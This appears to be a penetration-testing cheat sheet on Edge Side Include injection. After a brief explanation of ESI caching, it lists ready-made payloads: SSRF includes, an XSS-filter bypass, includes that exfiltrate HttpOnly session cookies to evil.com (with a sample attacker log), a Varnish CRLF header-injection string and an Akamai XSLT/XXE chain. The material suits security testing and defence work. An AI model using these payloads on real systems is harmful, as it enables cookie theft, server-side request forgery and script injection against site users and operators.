
## POC

**Theory**
The ESI language is based on a small set of XML tags and is used in many popular HTTP surrogate solutions to tackle performance issues by enabling heavy caching of Web content. 
ESI tags are used to instruct a reverse-proxy (or a caching server) to fetch more information about a web page for which a template is already cached. This information may come from another server before serving it to the client. 
This allows fully cached pages to include dynamic content.
One common use case for ESI is serving a largely static page with dynamic pieces of data.

Example's HTML file would look something like this:
```
<body>
  <b>The Weather Website</b>
  Weather for <esi:include src="/weather/name?id=$(QUERY_STRING{city_id})" />
  Monday: <esi:include src="/weather/week/monday?id=$(QUERY_STRING{city_id})" />
  Tuesday: <esi:include src="/weather/week/tuesday?id=$(QUERY_STRING{city_id})" />
[…]
```

### Side Effects of ESI Injections

Server-Side Request Forgery (SSRF)
```
<esi:include src="http://evil.com/ping/" />
```

### Bypass Client-Side XSS Filters
**poc.html**
```
<script>alert(1)</script>
Then, inject ESI tags to include the page:

GET /index.php?msg=<esi:include src="http://evil.com/poc.html" />
The SSRF will fetch the poc.html page and display it in the webpage, adding our payload to the DOM.
```
```
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>
>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

```
![Edge Side Include Injection](https://raw.githubusercontent.com/0xVIC/CheatSheets/master/Cross-site%20scripting/imgs/ESI_Engine_XSS.png)

### Bypass the HttpOnly Cookie Flag

Payload being processed by an ESI engine:
```
<esi:include src="http://evil.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
In the HTTP logs of the server evil.com, the attacker would then see:
```
127.0.0.1 evil.com - [08/Mar/2018:15:20:44 - 0500] "GET /?cookie=bf2fa962b7889ed8869cadaba282 HTTP/1.1" 200 2 "-" "-"
```
This way, HTTPOnly cookies could be exfiltrated without Javascript.

**SQUID3 poc**
```
<esi:include src="http://evil.com/$(HTTP_COOKIE)"/>.
```

**Varnish cache**
```
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```

**Akamai ESI Test Server (ETS)**
Extract cookies:
```
<esi:include src="http://evil.com/$(HTTP_COOKIE{'JSESSIONID'})"/>
```
```
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
The xslt file:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
**NodeJS ESI**
```
<esi:include src="http://evil.com/$(HTTP_COOKIE)"/>
```
